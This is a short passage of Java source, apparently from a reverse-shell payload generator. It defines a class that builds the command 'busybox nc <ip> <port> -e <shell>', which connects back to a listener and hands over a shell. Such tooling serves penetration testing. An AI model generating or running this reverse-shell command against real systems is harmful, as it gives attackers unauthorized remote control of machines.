...
public class Busybox_nce extends Reverse {

    protected String shellFormat = "";

    public Busybox_nce(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("busybox nc %s %s -e %s", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }
